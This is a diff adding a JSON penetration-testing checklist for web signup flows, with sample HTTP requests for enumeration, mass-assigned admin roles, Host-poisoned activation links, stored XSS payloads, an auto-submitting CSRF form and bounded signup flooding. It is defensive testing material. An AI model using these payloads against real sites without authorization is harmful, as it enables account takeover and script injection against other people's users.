@@ -1,0 +1,247 @@
+{
+  "schema_version": "1.0.0",
+  "id": "registration",
+  "title": "Registration / signup",
+  "summary": "Self-service signup: enumeration, mass-assigned roles, verify-skip, Host-poisoned activation mail, stored XSS in profile fields, and signup CSRF.",
+  "when": {
+    "registration": [
+      "yes"
+    ]
+  },
+  "also_when": {},
+  "default_for": [],
+  "groups": [
+    {
+      "id": "identity",
+      "title": "Account creation",
+      "summary": "Whether signup discloses existing accounts, accepts weak secrets, or binds a role the UI never offered.",
+      "checks": [
+        {
+          "id": "enum-register",
+          "title": "Registration account enumeration",
+          "item": "WAPT-AUTH-007",
+          "related": [
+            "WAPT-AUTH-005",
+            "WAPT-AUTH-009"
+          ],
+          "severity": "medium",
+          "why": "A taken address or username returns a different status, body, or timing than a fresh one.",
+          "validate": "Responses distinguish existing from non-existing accounts consistently across repeats.",
+          "variants": [
+            {
+              "name": "Taken vs fresh email",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"email\":\"known.user@example.com\",\"password\":\"ChangeMe1!\"}",
+              "expect": "Compare with a never-used address. Diff status, Location, JSON code, and body length."
+            },
+            {
+              "name": "Taken username",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&email=fresh%40example.com&password=ChangeMe1!",
+              "expect": "\"Username taken\" vs a generic failure. Also try Admin / ADMIN / admin@ vs the live account."
+            },
+            {
+              "name": "Canonicalization",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"email\":\"Known.User+tag@example.com\",\"password\":\"ChangeMe1!\"}",
+              "expect": "Plus-tags, mixed case, and unicode homoglyphs must not create a second account for the same mailbox."
+            }
+          ]
+        },
+        {
+          "id": "weak-password",
+          "title": "Weak and truncated passwords",
+          "item": "WAPT-AUTH-012",
+          "related": [
+            "WAPT-AUTH-010",
+            "WAPT-AUTH-011"
+          ],
+          "severity": "medium",
+          "why": "Signup accepts a documented bad password, or silently truncates a long one.",
+          "validate": "A known-bad or truncated secret becomes the stored credential for your test account.",
+          "variants": [
+            {
+              "name": "Common passwords",
+              "kind": "note",
+              "payload": "password\nPassword1\n12345678\nqwerty\nletmein\nWelcome1\nchangeme",
+              "expect": "Only a handful of tries against YOUR new test account. A success is the finding."
+            },
+            {
+              "name": "Long password truncation",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"email\":\"longpw@example.com\",\"password\":\"AAAAAAAAAA…(80 A)…BBBB\"}",
+              "expect": "Register with 80 As + BBBB, then log in with only the first 16/32/64 As. If that works, the secret was truncated."
+            }
+          ]
+        },
+        {
+          "id": "mass-assign-role",
+          "title": "Role / verified flag on signup",
+          "item": "WAPT-AUTHZ-016",
+          "related": [
+            "WAPT-API-012",
+            "WAPT-AUTHZ-019"
+          ],
+          "severity": "critical",
+          "why": "The binder accepts role, isAdmin, verified, or tenant_id the form never sends.",
+          "validate": "The created account has a privilege or verified state the UI did not offer.",
+          "variants": [
+            {
+              "name": "Hidden privilege fields",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"email\":\"tester@example.com\",\"password\":\"ChangeMe1!\",\"role\":\"admin\",\"isAdmin\":true,\"verified\":true,\"tenant_id\":1}",
+              "expect": "Read /me after signup. role/isAdmin/verified/tenant_id must be the defaults, not these values."
+            },
+            {
+              "name": "Nested wrapper",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"user\":{\"email\":\"tester2@example.com\",\"password\":\"ChangeMe1!\",\"role\":\"admin\"}}",
+              "expect": "Some binders take the nested object. Also try role[]=admin and role=admin as form fields."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "activation",
+      "title": "Activation and abuse",
+      "summary": "Email verify skip, Host-poisoned activation links, stored XSS, CSRF, and bounded signup flooding.",
+      "checks": [
+        {
+          "id": "verify-skip",
+          "title": "Email-verify skip",
+          "item": "WAPT-AUTH-017",
+          "related": [
+            "WAPT-AUTH-018"
+          ],
+          "severity": "high",
+          "why": "The account is usable before the mailbox is proved, or a direct post-verify URL works without the token.",
+          "validate": "An authenticated session or privileged action succeeds without completing verification.",
+          "variants": [
+            {
+              "name": "Use the app immediately",
+              "kind": "note",
+              "payload": "Complete signup, do not open the mail, then GET /app or GET /api/v1/me.",
+              "expect": "Must stay unverified / 403. A full session is the finding if the product claims verification is required."
+            },
+            {
+              "name": "Direct verify URL",
+              "kind": "request",
+              "payload": "GET /verify-email?token= HTTP/1.1\nHost: www.example.com\nCookie: session=<pre-verify-session>",
+              "expect": "Empty, reused, or another account's token must fail. Also try POST /verify with verified=true."
+            }
+          ]
+        },
+        {
+          "id": "host-invite",
+          "title": "Host-poisoned activation / invite link",
+          "item": "WAPT-INJ-048",
+          "related": [
+            "WAPT-AUTH-026",
+            "WAPT-HTTP-012"
+          ],
+          "severity": "critical",
+          "why": "The activation email is built from Host or X-Forwarded-Host, so the token is delivered to an attacker origin.",
+          "validate": "The mail contains a working token URL whose host is one you control. Use a disposable inbox.",
+          "variants": [
+            {
+              "name": "Arbitrary Host on register",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: evil.example\nContent-Type: application/json\n\n{\"email\":\"tester@example.com\",\"password\":\"ChangeMe1!\"}",
+              "expect": "The mail must still point at the canonical origin. If it points at evil.example, that is the finding."
+            },
+            {
+              "name": "X-Forwarded-Host",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: evil.example\nContent-Type: application/json\n\n{\"email\":\"tester@example.com\",\"password\":\"ChangeMe1!\"}",
+              "expect": "Same check. Also try Forwarded: host=evil.example and duplicate Host."
+            },
+            {
+              "name": "Invite accept",
+              "kind": "request",
+              "payload": "POST /invites HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: evil.example\nContent-Type: application/json\nAuthorization: Bearer <admin-token>\n\n{\"email\":\"new.user@example.com\"}",
+              "expect": "Invite mail is the same class as activation mail."
+            }
+          ]
+        },
+        {
+          "id": "xss-register",
+          "title": "Stored XSS in signup fields",
+          "item": "WAPT-XSS-002",
+          "related": [
+            "WAPT-XSS-001",
+            "WAPT-XSS-012"
+          ],
+          "severity": "high",
+          "why": "Display name, company, or bio is stored and later rendered into HTML without encoding.",
+          "validate": "A marker you stored executes in a realistic viewer context (your other account or an admin review queue).",
+          "variants": [
+            {
+              "name": "HTML in display name",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"email\":\"xss@example.com\",\"password\":\"ChangeMe1!\",\"name\":\"<img src=x onerror=alert(1)>\",\"company\":\"<svg/onload=alert(1)>\"}",
+              "expect": "View the profile as another user and in any admin queue. Execution or a dangling markup capture is the finding."
+            },
+            {
+              "name": "Attribute breakout",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=xss2%40example.com&password=ChangeMe1!&name=%22%20onfocus%3Dalert(1)%20autofocus%3D%22",
+              "expect": "If the name lands in an attribute, a quote breakout executes. Confirm in the real page, not a raw JSON dump."
+            }
+          ]
+        },
+        {
+          "id": "csrf-register",
+          "title": "Signup CSRF",
+          "item": "WAPT-CSRF-002",
+          "related": [
+            "WAPT-CSRF-013",
+            "WAPT-RATE-006"
+          ],
+          "severity": "medium",
+          "why": "A cross-site POST creates an account or binds the victim to an attacker-chosen identity.",
+          "validate": "A cross-origin form creates a real account or logs the victim into one they did not start.",
+          "variants": [
+            {
+              "name": "Cross-site signup form",
+              "kind": "html",
+              "payload": "<form action=\"https://www.example.com/register\" method=\"POST\">\n  <input name=\"email\" value=\"attacker@example.com\">\n  <input name=\"password\" value=\"ChangeMe1!\">\n</form>\n<script>document.forms[0].submit()</script>",
+              "expect": "Must fail without a valid CSRF token / SameSite=Strict. Impact needs a created account, not just a 200."
+            },
+            {
+              "name": "JSON as text/plain",
+              "kind": "request",
+              "payload": "POST /api/register HTTP/1.1\nHost: www.example.com\nContent-Type: text/plain\nOrigin: https://evil.example\n\n{\"email\":\"attacker@example.com\",\"password\":\"ChangeMe1!\"}",
+              "expect": "A JSON-only handler that also parses text/plain is CSRF-simple. Must reject or require a custom header."
+            }
+          ]
+        },
+        {
+          "id": "rate-register",
+          "title": "Registration flooding",
+          "item": "WAPT-RATE-006",
+          "related": [
+            "WAPT-AUTH-016"
+          ],
+          "severity": "medium",
+          "why": "Unbounded signup creates accounts, burns mail, or DoSes a downstream identity provider.",
+          "validate": "A bounded burst is stopped, or it is not. Do not flood; ten tries is enough.",
+          "variants": [
+            {
+              "name": "Ten signups, distinct mails",
+              "kind": "note",
+              "payload": "POST /register ten times with tester+1@example.com … tester+10@example.com and the same password.",
+              "expect": "Captcha, backoff, or 429. If all ten succeed, record the count and stop."
+            },
+            {
+              "name": "Same mail, many attempts",
+              "kind": "note",
+              "payload": "Repeat signup for one address after the first success or first pending-verify.",
+              "expect": "Must not create a second pending identity or resend mail without a limit."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
